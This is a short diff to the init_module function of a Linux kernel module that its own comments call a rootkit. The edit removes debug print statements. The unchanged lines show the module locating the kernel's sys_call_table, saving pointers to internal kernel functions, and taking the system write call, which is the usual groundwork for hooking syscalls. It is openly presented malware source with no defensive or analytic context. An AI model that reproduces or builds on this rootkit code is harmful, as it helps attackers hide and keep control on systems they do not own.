@@ -82,14 +82,12 @@ int init_module(void)
 	/*
 	 * Search sys_call_table[] address.
 	 */
-	printk("0\n");
 	*sys_call_table() = search_sct();
-	printk("1\n");
 	if (*sys_call_table() == NULL) {
 		return -1;
 	}
-	printk("2\n");
-    /*
+    
+	/*
      * Linux Kernel symbols for our rootkit.
      */
     *f_kmalloc() = kmalloc;
@@ -97,7 +95,6 @@ int init_module(void)
     *f_find_vpid() = find_vpid;
     *f_vscnprintf() = vscnprintf;
     *f_sys_write() = (*sys_call_table())[__NR_write]; // now we can print into stdout =)
-	printk("3\n");
 
 	pinfo("Hurra! sys_call_table = %p\n", *sys_call_table());
 
